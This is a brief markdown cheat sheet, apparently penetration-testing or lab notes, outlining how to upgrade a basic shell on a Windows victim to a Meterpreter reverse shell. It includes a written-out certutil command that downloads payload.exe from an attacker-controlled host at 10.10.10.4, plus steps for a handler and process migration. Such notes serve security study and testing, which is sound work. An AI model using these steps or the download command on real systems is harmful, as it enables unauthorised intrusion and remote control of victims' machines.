# upgrading to meterpreter shell
* get a standard shell through exploitation
* generate a meterpreter reverse shell payload with msfvenom
* upload the meterpreter payload to the attack system
  * e.g. with python http server on the attack machine
  * and use certutil file download from the victim machine
    * C:\> certutil -urlcache -f http://10.10.10.4/payload.exe
* setup multi handler on attack machine
* run meterpreter payload on victim machine (through the standard shell)
* GOT METERPRETER SHELL
* migrate to some better process
